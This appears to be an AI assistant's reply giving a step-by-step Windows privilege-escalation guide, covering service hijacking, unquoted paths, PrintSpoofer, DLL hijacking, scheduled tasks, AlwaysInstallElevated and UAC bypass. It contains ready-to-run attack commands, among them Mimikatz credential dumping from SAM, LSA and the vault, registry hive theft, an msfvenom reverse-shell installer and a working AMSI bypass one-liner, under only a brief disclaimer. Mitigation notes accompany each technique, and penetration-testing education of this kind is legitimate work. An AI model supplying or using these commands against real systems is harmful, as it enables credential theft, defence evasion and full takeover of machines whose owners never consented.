Of course. Here is a guide to the Windows privilege escalation techniques you listed. This guide is for educational and ethical purposes only. **Never** perform these actions on systems you do not have explicit, written permission to test.

---

### **A Note on Methodology**

Privilege escalation isn't about running one magic command. It's a **methodical process** of information gathering (**enumeration**) followed by identifying and exploiting a weakness. Automated scripts like **WinPEAS** and **PowerUp** are excellent for quickly finding low-hanging fruit, but understanding the underlying manual checks is crucial.

The general process is:
1.  **Enumerate:** Gather as much information as possible about the system (OS version, patch level, users, services, running processes, network configuration, etc.).
2.  **Analyze:** Sift through the enumerated data to find potential misconfigurations or vulnerabilities.
3.  **Exploit:** Use a known technique to leverage the weakness and gain higher privileges.
4.  **Persist (Optional):** Establish a way to maintain access after a reboot.

---

### ## 1. Enumeration / Basic Commands

This is the most critical phase. You need to understand the system you're on.

* **What to look for:** OS version, patch level, user context, group memberships, running processes, scheduled tasks, network information, and writable folders.
* **Core Commands:**
    * **Who am I?:** Find out your current user and privileges.
        ```powershell
        whoami /all
        ```
        *Example Output (Look for interesting groups like 'Administrators' or privileges like 'SeImpersonatePrivilege'):*
        ```
        USER INFORMATION
        ----------------
        User Name      SID
        ======================= ==================================================
        desktop-name\lowprivuser S-1-5-21-.....

        GROUP INFORMATION
        -----------------
        Group Name                           Type             SID          Attributes
        ==================================== ================ ============ ==================================================
        Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default
        BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default

        PRIVILEGES INFORMATION
        ----------------------
        Privilege Name                Description                               State
        ============================= ========================================= =======
        SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
        SeImpersonatePrivilege        Impersonate a client after authentication Enabled  <-- VULNERABLE
        ```

    * **System Information:** Get OS version and architecture. This is key for finding kernel exploits.
        ```powershell
        systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        ```
        *Example Output:*
        ```
        OS Name:                   Microsoft Windows 10 Pro
        OS Version:                10.0.19044 N/A Build 19044
        System Type:               x64-based PC
        ```

    * **Running Processes & Services:** See what's running and under which user account.
        ```powershell
        tasklist /SVC
        net start
        ```

    * **Network Configuration:** See network interfaces and listening ports.
        ```powershell
        ipconfig /all
        netstat -ano
        ```

---

### ## 2. Weak Service Permissions

A service is a program that runs in the background, often as the powerful `NT AUTHORITY\SYSTEM` user. If a low-privilege user can modify or restart a high-privilege service, they can hijack it.

* **What to look for:** Services where a non-administrative user or group has permissions like `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`.
* **Commands & Tools:**
    * **AccessChk:** A Sysinternals tool for checking permissions. The command checks which services the 'Users' group can modify.
        ```powershell
        accesschk.exe /accepteula -uwcqv "Users" *
        ```
    * **WinPEAS/PowerUp:** These scripts automate the detection process.
        * PowerUp command: `Invoke-AllChecks`
* **Exploitation:**
    1.  Find a vulnerable service (e.g., `VulnSvc`).
    2.  Use `sc` (Service Control) to reconfigure the service's executable path (`binPath`) to point to your own malicious executable.
        ```powershell
        sc config VulnSvc binPath= "C:\tmp\reverse_shell.exe"
        ```
    3.  Restart the service to execute your payload.
        ```powershell
        sc stop VulnSvc
        sc start VulnSvc
        ```
* **Mitigation:** Apply the principle of least privilege. Ensure that only authorized administrators can modify service configurations.

---

### ## 3. Unquoted Service Paths

This is a specific type of service misconfiguration. If a service path with spaces is not enclosed in quotes (e.g., `C:\Program Files\Some Dir\service.exe`), Windows will try to execute paths sequentially. An attacker can place a malicious executable in a higher-level directory to be executed first.

* **What to look for:** Service paths with spaces that aren't in quotes, combined with write permissions in an intermediary directory (like `C:\Program Files\`).
* **Commands & Tools:**
    * **Manual Check (WMIC):** This command finds services with unquoted paths that are not in the default Windows directory.
        ```powershell
        wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
        ```
        *Example Output:*
        ```
        Vulnerable Service      VulnSvc      C:\Program Files\Vulnerable App\vuln.exe    Auto
        ```
    * **PowerUp:** `Get-UnquotedService`
* **Exploitation:**
    1.  Identify the vulnerable path: `C:\Program Files\Vulnerable App\vuln.exe`.
    2.  Check for write permissions in `C:\Program Files\`.
    3.  If writable, place a malicious executable named `Vulnerable.exe` in `C:\Program Files\`.
    4.  Restart the service. Windows will execute `C:\Program Files\Vulnerable.exe` with SYSTEM privileges instead of the intended file.
* **Mitigation:** **Always** enclose service executable paths in quotation marks.

---

### ## 4. SeImpersonate / SeAssignPrimaryToken Privilege Escalation

These are powerful user privileges that, if held by an account (even a service account like `IIS` or `SQL Server`), can often be abused to impersonate the `SYSTEM` user and execute code.

* **What to look for:** The output of `whoami /priv` showing `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` as `Enabled`.
* **Tools (Exploitation):**
    * **Juicy Potato / Rotten Potato:** Classic tools that exploit COM server interactions to elevate privileges.
    * **PrintSpoofer:** A more modern and reliable tool that exploits the Print Spooler service.
* **Exploitation (with PrintSpoofer):**
    1.  Verify you have the privilege: `whoami /priv`.
    2.  Use PrintSpoofer to launch a command prompt as `NT AUTHORITY\SYSTEM`.
        ```powershell
        PrintSpoofer.exe -i -c "cmd.exe"
        ```
    3.  A new command prompt window will open. Run `whoami` in it, and you should see:
        ```
        nt authority\system
        ```
* **Mitigation:** Avoid assigning these powerful privileges to service accounts unless absolutely necessary. Run services as low-privileged "virtual accounts" where possible.

---

### ## 5. DLL Hijacking

This occurs when an application tries to load a Dynamic-Link Library (DLL) without specifying its full path. It will search for the DLL in a predefined order, including the directory the application was launched from. If an attacker can place a malicious DLL with the same name in a location that is searched *before* the legitimate one, the application will load the malicious code.

* **What to look for:** Running processes where the user has write permissions in the same directory as the executable, or in a directory listed in the system's `PATH` environment variable.
* **Tools:**
    * **ProcMon (Process Monitor):** A Sysinternals tool. Filter for `NAME NOT FOUND` results for operations on files ending in `.dll`. This shows you which DLLs an application tried to load but couldn't find.
* **Exploitation:**
    1.  Use ProcMon to identify a missing DLL for a process running with higher privileges (e.g., `missing.dll`).
    2.  Verify you have write permissions in one of the search locations (e.g., the application's folder).
    3.  Craft a malicious DLL with the same name (`missing.dll`) that executes your payload (e.g., a reverse shell).
    4.  Place your malicious DLL in the writable location.
    5.  Restart the application. It will load your DLL, and your code will execute with the application's privileges.
* **Mitigation:** Developers should always use absolute paths when loading DLLs. Ensure program directories are not writable by standard users.

---

### ## 6. Sensitive Files & Hashes (SAM/LSA Secrets)

Windows stores user password hashes in the **Security Account Manager (SAM)** file and other secrets (like service account passwords) in the **Local Security Authority (LSA)** memory. If you can gain administrative or SYSTEM access, you can dump these secrets.

* **What to look for:** The ability to run code as Administrator or SYSTEM. Also, look for sensitive data in unsecured files like `unattended.xml`, `web.config`, or PowerShell history.
* **Commands & Tools:**
    * **Mimikatz:** The quintessential tool for credential dumping. It requires high privileges to run successfully.
        ```powershell
        # Must be run from a high-privilege prompt
        privilege::debug
        lsadump::sam  # Dumps NTLM hashes from the SAM
        lsadump::lsa /patch # Dumps secrets from LSA memory
        ```
        *Example Output (NTLM Hash):*
        ```
        User: Administrator
        NTLM: 32ed87bd5fdc5e9cba88547376818d4c
        ```
    * **Registry Save:** You can also dump the SAM and SYSTEM registry hives manually from a high-privilege shell.
        ```powershell
        reg save hklm\sam C:\tmp\sam.save
        reg save hklm\system C:\tmp\system.save
        ```
        These files can then be taken offline and analyzed with tools like `impacket-secretsdump`.
* **Exploitation:** The dumped NTLM hashes can be used in **Pass-the-Hash** attacks to authenticate to other machines on the network as that user, without ever needing the plaintext password. They can also be cracked offline using tools like **Hashcat** or **John the Ripper**.
* **Mitigation:** Enable **Credential Guard** on modern Windows systems. Restrict administrative access and monitor for common dumping tools.

---

### ## 7. Windows Vault / Credential Manager

The Windows Credential Manager (or Vault) stores saved credentials for network shares, RDP sessions, and websites. A user can access their own vault, and an administrator can access anyone's.

* **What to look for:** Saved credentials for high-value targets (like domain controllers or other servers).
* **Commands & Tools:**
    * **List stored credentials:**
        ```powershell
        cmdkey /list
        ```
    * **VaultCmd (PowerShell):**
        ```powershell
        vaultcmd /list
        ```
    * **Mimikatz:**
        ```powershell
        # Dumps credentials from the vault
        vault::cred
        ```
* **Exploitation:** Use the discovered plaintext passwords to pivot to other systems or escalate privileges.
* **Mitigation:** Educate users not to save sensitive credentials, especially for administrative accounts.

---

### ## 8. Scheduled Tasks

If a scheduled task is configured to run with high privileges (like SYSTEM) and a low-privilege user can modify the file or script that the task executes, they can escalate their privileges.

* **What to look for:** Tasks running as SYSTEM or Administrator where the target script/binary is in a location writable by your current user.
* **Commands & Tools:**
    * **List tasks and their configurations:**
        ```powershell
        schtasks /query /fo LIST /v
        ```
    * Use `icacls` or `accesschk.exe` to check permissions on the file specified in the task's "Actions".
* **Exploitation:**
    1.  Find a task running as SYSTEM that executes `C:\Path\To\script.bat`.
    2.  Check permissions for `script.bat`. If you can write to it:
        ```powershell
        icacls C:\Path\To\script.bat
        ```
    3.  Overwrite `script.bat` with your own malicious commands (e.g., a command to add a new local admin).
    4.  Wait for the task to run.
* **Mitigation:** Ensure that files and scripts executed by high-privilege scheduled tasks are not modifiable by non-administrative users.

---

### ## 9. AlwaysInstallElevated

This is a pair of registry keys that, when both are set, cause any Windows Installer (`.msi`) package to be installed with SYSTEM privileges, regardless of who runs it.

* **What to look for:** Two specific registry keys being set to `1`.
* **Commands & Tools:**
    * **Manual Registry Check:**
        ```powershell
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        ```
        *If both return a value of `0x1`, the system is vulnerable.*
    * **WinPEAS/PowerUp:** `Get-AlwaysInstallElevated`
* **Exploitation:**
    1.  Use `msfvenom` to create a malicious `.msi` package.
        ```powershell
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f msi -o malicious.msi
        ```
    2.  Transfer the `malicious.msi` file to the target machine.
    3.  "Install" it using the `msiexec` command. No special privileges are needed to run the command itself.
        ```powershell
        msiexec /quiet /qn /i C:\tmp\malicious.msi
        ```
    4.  The installer will run with SYSTEM privileges, executing your payload.
* **Mitigation:** This setting should never be enabled. Ensure both registry keys are set to `0` or are non-existent.

---

### ## 10. UAC Bypass

User Account Control (UAC) is a security feature, not a security boundary. It's designed to prevent accidental changes by prompting for confirmation. Many techniques exist to bypass these prompts and run code in a high-integrity (elevated) context.

* **What it is:** Abusing legitimate Windows processes that are "auto-elevated" to execute malicious code without triggering a UAC prompt. A common method involves hijacking a process that looks for a file or registry key in a user-controlled location.
* **Tools:** The **UACME** project on GitHub is a massive collection of UAC bypass techniques. Metasploit also has several UAC bypass modules (`exploit/windows/local/bypassuac_*`).
* **Example (Fodhelper method):**
    1.  The `fodhelper.exe` program is an auto-elevating binary.
    2.  When it runs, it checks for specific registry keys in the current user's hive (`HKCU`).
    3.  An attacker can create a specific registry key under `HKCU:\Software\Classes\` that points to their malicious command.
    4.  When `fodhelper.exe` is executed, it reads this malicious key and executes the command in a high-integrity context, bypassing the UAC prompt.
* **Mitigation:** Keep systems patched. Set UAC to its highest level ("Always notify"). Most importantly, do not rely on UAC as a primary security control; a standard user should not be able to compromise the system even after a bypass.

---

### ## 11. AMSI Bypass

AMSI (Antimalware Scan Interface) is a Windows feature that allows applications and scripts (especially PowerShell) to be scanned by the installed antivirus software before they execute. Attackers need to bypass this to run their enumeration and exploit scripts without being detected.

* **What it is:** It is not a privilege escalation technique itself, but a **critical enabler**. It's a method of disabling or tricking AMSI within a process so that malicious PowerShell commands can be run.
* **Example Bypass:** There are many one-liners available online. A classic example (often patched/detected now) involves patching the `AmsiScanBuffer` function in memory to make it non-functional for the current PowerShell session.
    ```powershell
    # Example concept, real-world one-liners are more obfuscated
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    ```
* **Usage:** An attacker will run the AMSI bypass first in their PowerShell session. After that, they can load tools like `PowerUp.ps1` or `Mimikatz.ps1` from memory, which would have otherwise been blocked.
* **Mitigation:** Use modern endpoint detection and response (EDR) solutions, enable constrained language mode in PowerShell, and use application control solutions to prevent untrusted scripts from running.

---

### ## Other Topics

* **Windows Permissions (`icacls`):** This is a fundamental concept underlying many other vulnerabilities (Weak Services, Unquoted Paths, DLL Hijacking, Scheduled Tasks). The key is using the `icacls` or `Get-Acl` commands to find locations where a low-privilege user can write files that a high-privilege process will execute.
* **Shells (bind/reverse):** These are the **payloads**, not the escalation technique. After you exploit a vulnerability, you need a way to control the machine with your new privileges.
    * **Reverse Shell:** The compromised machine *connects out* to your attacker machine. This is more common as it often bypasses firewalls.
    * **Bind Shell:** The compromised machine *opens a port and listens* for you to connect to it.
* **Cross-Compilation:** This refers to compiling code (like an exploit) on one platform (e.g., your Linux attacker machine) to run on another (e.g., the Windows target). The `mingw-w64` toolchain is commonly used for this. For example: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe`.
* **Registry Paths:** Similar to file permissions, weak permissions on registry keys can lead to privilege escalation. If a high-privilege process reads a configuration from a registry key that a low-privilege user can write to, that process can be manipulated. Use `accesschk.exe -k` to check key permissions.
